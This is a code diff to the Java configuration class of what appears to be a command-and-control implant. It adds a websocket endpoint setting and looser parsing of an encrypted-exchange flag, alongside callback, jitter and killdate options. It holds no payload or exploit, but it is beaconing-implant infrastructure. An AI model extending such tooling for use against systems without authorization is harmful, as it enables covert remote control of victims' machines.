@@ -19,6 +19,7 @@ public class Config {
                     ", callbackPort=" + callbackPort +
                     ", getUri='" + getUri + '\'' +
                     ", postUri='" + postUri + '\'' +
+                    ", endpointReplace='" + endpointReplace + '\'' +
                     ", sleepInterval=" + sleepInterval +
                     ", jitter=" + jitter +
                     ", debug=" + debug +
@@ -40,6 +41,7 @@ public class Config {
     private int callbackPort;
     private String getUri;
     private String postUri;
+    private String endpointReplace;
     private int sleepInterval;
     private int jitter;
     private String uuid;
@@ -80,6 +82,7 @@ public class Config {
             
             config.getUri = trimOrNull(props.getProperty("get_uri"));
             config.postUri = trimOrNull(props.getProperty("post_uri"));
+            config.endpointReplace = trimOrNull(props.getProperty("endpoint_replace", "socket"));
             config.sleepInterval = Integer.parseInt(props.getProperty("callback_interval").trim()) * 1000; // Convert to ms
             config.jitter = Integer.parseInt(props.getProperty("callback_jitter").trim());
             
@@ -98,7 +101,11 @@ public class Config {
             }
             
             config.debug = Boolean.parseBoolean(props.getProperty("debug", "false").trim());
-            config.encryptedExchangeCheck = Boolean.parseBoolean(props.getProperty("encrypted_exchange_check", "false").trim());
+            
+            // Handle both "true"/"false" and "T"/"F" for encrypted_exchange_check (websocket profile uses T/F)
+            String eecValue = props.getProperty("encrypted_exchange_check", "false").trim();
+            config.encryptedExchangeCheck = eecValue.equalsIgnoreCase("true") || eecValue.equalsIgnoreCase("t");
+            
             config.killdate = trimOrNull(props.getProperty("killdate", ""));
             config.proxyHost = trimOrNull(props.getProperty("proxy_host", ""));
             
@@ -157,6 +164,14 @@ public class Config {
             return "/" + postUri;
         }
         return postUri;
+    }
+    
+    public String getEndpointReplace() {
+        // Ensure URI starts with /
+        if (endpointReplace != null && !endpointReplace.startsWith("/")) {
+            return "/" + endpointReplace;
+        }
+        return endpointReplace;
     }
     
     public int getSleepInterval() {
